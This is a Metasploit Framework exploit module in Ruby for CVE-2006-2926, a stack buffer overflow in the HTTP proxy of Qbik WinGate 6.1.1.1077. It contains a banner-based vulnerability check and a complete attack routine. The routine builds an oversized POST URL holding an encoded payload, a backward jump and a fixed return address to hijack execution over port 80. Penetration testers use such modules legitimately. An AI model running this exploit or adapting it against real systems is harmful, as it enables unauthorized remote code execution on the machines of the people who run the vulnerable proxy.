##
# $Id: qbik_wingate_wwwproxy.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Qbik WinGate WWW Proxy Server URL Processing Overflow\',
			\'Description\'    => %q{
					This module exploits a stack buffer overflow in Qbik WinGate version
				6.1.1.1077 and earlier. By sending malformed HTTP POST URL to the
				HTTP proxy service on port 80, a remote attacker could overflow
				a buffer and execute arbitrary code.
			},
			\'Author\'         => \'patrick\',
			\'License\'        => MSF_LICENSE,
			\'Version\'        => \'$Revision: 10394 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2006-2926\' ],
					[ \'OSVDB\', \'26214\' ],
					[ \'BID\', \'18312\' ],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 1000,
					\'BadChars\' => \"\\x00\\x0a\\x0d\\x20+&=%\\/\\\\\\#;\\\"\\\':<>?\",
					\'EncoderType\'   => Msf::Encoder::Type::AlphanumMixed,
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'WinGate 6.1.1.1077\', { \'Ret\' => 0x01991932 } ], # call esi
				],
			\'Privileged\'     => true,
			\'DisclosureDate\' => \'Jun 07 2006\',
			\'DefaultTarget\' => 0))

		register_options(
			[
				Opt::RPORT(80)
			], self.class)
	end

	def check
		connect
		sock.put(\"GET /\\r\\n\\r\\n\") # Malformed request to get proxy info
		banner = sock.get_once
		if (banner =~ /Server:\\sWinGate\\s6.1.1\\s\\(Build 1077\\)/)
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		print_status(\"Trying target #{target.name}...\")

		buff = Rex::Text.rand_text_alphanumeric(3000)
		buff[1200, 1000] = payload.encoded # jmp here
		buff[2200, 5] = Rex::Arch::X86.jmp(-1005) # esi
		buff[2284, 4] = [target[\'Ret\']].pack(\'V\') #eip

		sploit  = \"POST http://#{buff}/ HTTP/1.0\\r\\n\\r\\n\"

		sock.put(sploit)
		sock.get_once(-1, 3)

		handler
		disconnect
	end

end
